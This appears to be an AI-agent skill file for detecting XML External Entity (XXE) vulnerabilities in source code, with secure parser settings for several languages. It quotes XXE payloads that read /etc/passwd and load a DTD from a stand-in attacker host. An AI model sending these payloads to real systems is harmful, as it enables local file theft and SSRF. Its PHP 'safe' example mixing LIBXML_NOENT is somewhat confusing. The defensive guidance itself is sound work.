---
name: sast-xxe
description: >-
  Find XXE in source: XML parsers with external entities enabled, missing
  disallow-doctype-decl, vulnerable SOAP, SAML, DOCX, XLSX and SVG parsing, and blind
  out-of-band entity expansion. Use when asked about XML external entity injection. Do not
  use for XML schema or parsing correctness bugs that carry no entity risk.
mitre_attack: [T1190, T1005]
---

# XML External Entity (XXE) Detection

You are performing a focused security assessment to find XXE vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (find XML parsing sites where external entities are not safely disabled), **batched verify** (trace whether user-supplied input reaches those parsers, in parallel batches of 3), and **merge** (consolidate batch results into one report).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is XXE

XXE occurs when an XML parser processes a document containing a reference to an external entity and the parser has external entity resolution enabled. An attacker who can supply XML input can use this to read arbitrary local files, perform server-side request forgery (internal network probing), trigger denial-of-service via entity expansion (Billion Laughs), or in some stacks execute OS commands.

The core pattern: *user-controlled XML reaches an XML parser that has not disabled DTD processing or external entity resolution.*

### What XXE IS

- XML parsed with external entity resolution **enabled by default** and no explicit hardening applied
- `SYSTEM` entity declarations that reference `file://` or `http://` URIs: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- DTD processing not explicitly disabled in parsers where it is on by default (Java DOM/SAX, PHP SimpleXML/DOMDocument, libxml2-backed parsers)
- Parameter entity injection in DTDs: `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;`
- XInclude injection when XInclude processing is enabled
- SSRF via XXE: using `http://` or `https://` external entity URLs to reach internal services
- Blind XXE via out-of-band exfiltration (DNS, HTTP callback to attacker-controlled server)

### What XXE is NOT

Do not flag these as XXE:

- **XSS via XML**: XML data rendered as HTML without escaping — that's XSS
- **SSRF via non-XML**: HTTP requests triggered by other mechanisms — that's SSRF
- **XML parsing of fully server-controlled data**: Config files, bundled resources, migration scripts with no user influence — not exploitable
- **Safe parsers**: Libraries that disable external entities by default and provide no way to re-enable them (e.g. `defusedxml` in Python, `nokogiri` with default settings in Ruby for untrusted input)

### Patterns That Prevent XXE

When you see these patterns, the parser is likely **not vulnerable**:

**1. Disabling DTD / external entities (Java DOM)**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**2. Disabling external entities (Java SAX)**
```java
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**3. Disabling external entities (Java StAX / XMLInputFactory)**
```java
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

**4. Python — defusedxml (always safe)**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(source)  # external entities, DTD, entity expansion all blocked
```

**5. Python — lxml with resolve_entities=False**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(source, parser)
```

**6. PHP — libxml_disable_entity_loader (PHP < 8.0) / LIBXML_NONET flag**
```php
libxml_disable_entity_loader(true);   // PHP 7.x — disables external entity loading
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_NONET);  // LIBXML_NONET blocks network
// Note: LIBXML_NOENT alone EXPANDS entities — it does NOT disable them
```

**7. .NET — XmlReaderSettings with DtdProcessing.Prohibit**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**8. Node.js — xml2js (safe by default in v0.5+)**
```javascript
const xml2js = require('xml2js');
// xml2js does not resolve external entities by default — safe
xml2js.parseString(xmlInput, callback);
```

---

## Reference index

Deep detail for this skill lives in `references/`; open the file that matches
the task instead of loading everything.

| File | Covers |
|------|--------|
| `references/01-vulnerable-vs-secure-examples.md` | Vulnerable vs. Secure Examples |
| `references/02-execution.md` | Execution; Important Reminders |
